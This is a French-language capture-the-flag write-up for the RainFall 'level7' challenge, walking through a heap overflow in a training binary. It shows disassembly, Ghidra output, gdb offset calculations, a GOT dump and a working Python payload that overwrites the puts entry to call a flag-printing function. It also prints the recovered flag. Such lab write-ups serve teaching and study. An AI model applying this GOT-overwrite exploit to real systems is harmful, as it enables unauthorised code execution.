# Level7: HEAP OVERFLOW

# Première étape — tester le programme

```bash
$ ./level7
Segmentation fault (core dumped)
$ ./level7 test
Segmentation fault (core dumped)
$ ./level7 test test
~~
$ ./level7 test test test
~~
```
### Target

Nous avons une fonction **m** qui fait un call system de cat sur le flag que nous cherchons parfait pour notre exploitation
```s
080484f4 <m>:
 80484f4:	55                   	push   %ebp
 80484f5:	89 e5                	mov    %esp,%ebp
 80484f7:	83 ec 18             	sub    $0x18,%esp
 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
 8048516:	08 
 8048517:	89 14 24             	mov    %edx,(%esp)
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
 804851f:	c9                   	leave  
 8048520:	c3                   	ret  
```

### main.c

Ce niveau est un peu plus complexe sur l'exploitation et sur la comprehension de l'assembleur alors nous allons utiliser **_ghidra_** pour voir le main en **C**

```c
undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;
  
  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
```
Nous avons **2 pointeurs undefined** puVar1 et puVar3 qui represente une structure et nous avons **1 pointeur variable** qui est un pointeur temporaire pour attitrer une adresse allouer dans la heap au structure puVar 1 et 3.

voici une visualization en structure C de puVar1 et puVar3

```c

struct puVar1 & puVar3
{
	int		i; [0]
	char	*ptr; [1]
}
```
> INFO: pvVar2 initialise avec malloc le pointeur char de puVar1 et puVar3.

En suite nous avons strcpy qui ecrit dans le **buffer char** de **puVar1 avec param_2 + 4 (argv[1])** et le second **strcpy** qui ecrit dans le **buffer char** de **puVar3 avec param_2 + 8 (argv[2])**.

```c
__stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
```
> la suite de notre programme ouvre le fichier .pass du level suivant ou est stocker notre flag et l'enregistre dans la variable global **c** et affiche dans le **stdout** ("~~") avec **puts**.



### Search fail exploitation

- 1ᵉʳ constat : Nous avons 2 buffer char de 8 octets dans les deux structure allouer l'un a coter de l'autre.
- 2ᵉᵐᵉ constat : Nous avons strcpy qui ecrit dans les deux buffer
- 3ᵉᵐᵉ constat : `c` est une variable globale dans lequel est stocker notre flag et la function `m` qui printf la global `c` mais qui n'est pas appeler dans le main.

**OK NOUS AVONS QUELQUE CHOSE.**

### offset

Nous allons calculer l'offset des pointeur allouer dans la heap.

```s
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp) # 1er adresse
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt> 
   0x08048550 <+47>:	mov    %eax,%edx # 2nd adresse
   ....
(gdb) p/x $eax
$1 = 0x804a008
(gdb) p/x $eax
$2 = 0x804a018
(gdb) p 0x804a018 - 0x804a008
$9 = 16
```
> _Notre offset est de 16 + 4 octets = 20_.

### payload

- Nous allons overflow le premier strcpy sur le pointeur char de la seconde structure pour remplacer l'adresse du prochain buffer char par l'adresse de ``puts``
- Dans le second strcpy nous allons tous simplement changer l'adresse de ``puts`` qui pointe sur la seconde structure par l'adresse de la function ``m``
- Normalement a l'execution de ``puts`` apres le ``fgets`` qui stock le resultat de notre ``flag`` le programme appelera ``m`` aulieu de ``gets``

- ptr_adr(m) = 0x080484f4

```bash
level7@RainFall:~$ objdump -R ./level7 

./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts #<============ Adress_ptr of puts in program
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```
- ptr_adr(puts) = 0x08049928


```bash
./level7 $(python -c 'print "A"*(20) + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

### testing

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A"*(20) + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1761146015
```

TADA ! 

Bonne chance et have fun :)
